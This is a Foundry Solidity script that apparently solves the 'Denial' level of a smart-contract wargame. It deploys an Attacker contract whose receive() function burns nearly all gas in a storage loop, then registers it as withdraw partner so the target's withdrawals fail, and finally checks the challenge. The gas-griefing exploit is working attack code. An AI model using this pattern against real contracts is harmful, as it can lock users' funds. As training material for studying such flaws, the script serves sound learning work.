// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "../src/20-Denial.sol";
import {DenialFactory} from "../src/DenialFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract DenialSolution is Script {
    Denial public denialLevel;
    address payable instanceAddress = payable(0xBb97A6fFF5441c441587C27437b05c6D1BDf79bE);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        denialLevel = Denial(instanceAddress);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attacker attacker = new Attacker();
        denialLevel.setWithdrawPartner(address(attacker));

        vm.stopBroadcast();

        validate();
    }

    function validate() internal {
        bool isValidated = new DenialFactory().validateInstance(instanceAddress, publicKey);
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attacker {
    uint256[] data;

    receive() external payable {
        while (gasleft() > 1000) {
            data.push(1);
        }
    }
}
